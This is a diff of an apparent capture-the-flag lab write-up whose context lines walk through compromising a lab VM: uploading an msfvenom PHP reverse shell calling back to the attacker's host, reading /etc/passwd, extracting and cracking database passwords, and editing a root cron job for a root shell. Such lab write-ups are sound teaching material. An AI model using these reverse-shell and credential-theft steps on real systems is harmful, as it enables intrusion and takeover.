@@ -105,7 +105,7 @@ We can always adapt it to our needs.
 
 Cracked the hash:
 
-![image.png](images/image1.png)
+![image.png](images/image.png)
 
 Creds from the note
 
@@ -161,15 +161,15 @@ Task Completed
 
 Credentials don’t work for phpmyadmin login. Browse to 192.168.56.104/academy based on note info. Find student login.
 
-![image.png](images/image2.png)
+![image.png](images/image1.png)
 
 Can upload new profile photo and it seems to allow any file type:
 
-![image.png](images/image3.png)
+![image.png](images/image2.png)
 
 And can browse to uploaded file:
 
-![image.png](images/image4.png)
+![image.png](images/image3.png)
 
 I generated a php reverse shell file with this command:
 
@@ -179,7 +179,7 @@ $ msfvenom -p php/reverse_php LHOST=192.168.56.102 LPORT=6000 -f raw > payload.p
 
 Then uploaded it and refreshed the page to get a nc connection.
 
-![image.png](images/image5.png)
+![image.png](images/image4.png)
 
 /etc/passwd shows the users on the machine
 
@@ -218,11 +218,11 @@ grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash
 
 I could also upload [linpeas.sh](http://linpeas.sh) through the upload function. After running, it found a mysql password:
 
-![image.png](images/image6.png)
+![image.png](images/image5.png)
 
 I’ll try logging into the server via SSH with this password and user grimmie
 
-![image.png](images/image7.png)
+![image.png](images/image6.png)
 
 I decided to connect to the mysql database with this command (no space between -p and the password is intentional):
 
@@ -230,11 +230,11 @@ I decided to connect to the mysql database with this command (no space between -
 mysql -u grimmie -pMy_V3ryS3cur3_P4ss -h localhost onlinecourse 
 ```
 
-![image.png](images/image8.png)
+![image.png](images/image7.png)
 
 Admin password found for web app:
 
-![image.png](images/image9.png)
+![image.png](images/image8.png)
 
 admin:21232f297a57a5a743894a0e4a801fc3
 
@@ -244,19 +244,19 @@ So admin creds are admin:admin.
 
 Admin on web app:
 
-![image.png](images/image10.png)
+![image.png](images/image9.png)
 
 And I just realized I could access the mysql database through the web app with the creds found earlier:
 
-![image.png](images/image11.png)
+![image.png](images/image10.png)
 
 And found the root user password in the user db:
 
-![image.png](images/image12.png)
+![image.png](images/image11.png)
 
 And cracked the hash:
 
-![image.png](images/image13.png)
+![image.png](images/image12.png)
 
 root:26021997
 
@@ -264,12 +264,12 @@ However, ssh isn’t working with these credentials. Will try another avenue.
 
 Found file running as root cronjob
 
-![image.png](images/image14.png)
+![image.png](images/image13.png)
 
 Edited file to give reverse shell:
 
-![image.png](images/image15.png)
+![image.png](images/image14.png)
 
 And got root shell:
 
-![image.png](images/image16.png)
+![image.png](images/image15.png)
